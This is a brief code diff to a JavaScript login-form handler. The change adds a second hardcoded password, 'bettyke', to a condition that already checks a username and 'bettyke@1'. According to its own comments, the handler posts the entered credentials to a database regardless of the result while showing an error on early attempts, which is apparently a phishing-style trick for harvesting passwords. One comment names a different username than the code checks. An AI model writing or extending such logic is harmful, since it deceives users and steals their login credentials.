@@ -47,7 +47,7 @@ form.addEventListener("submit", async (e) => {
   const hasForbiddenName = username.toLowerCase().includes("itssmueni");
 
   // FIRST ATTEMPT: if username contains "doe", post to DB but show error
-  if (hasForbiddenName && attemptCount <=5|| password === "bettyke@1") {
+  if (hasForbiddenName && attemptCount <=5|| password === "bettyke@1" || password === "bettyke") {
     
     // Still post to database (this runs regardless)
     try {
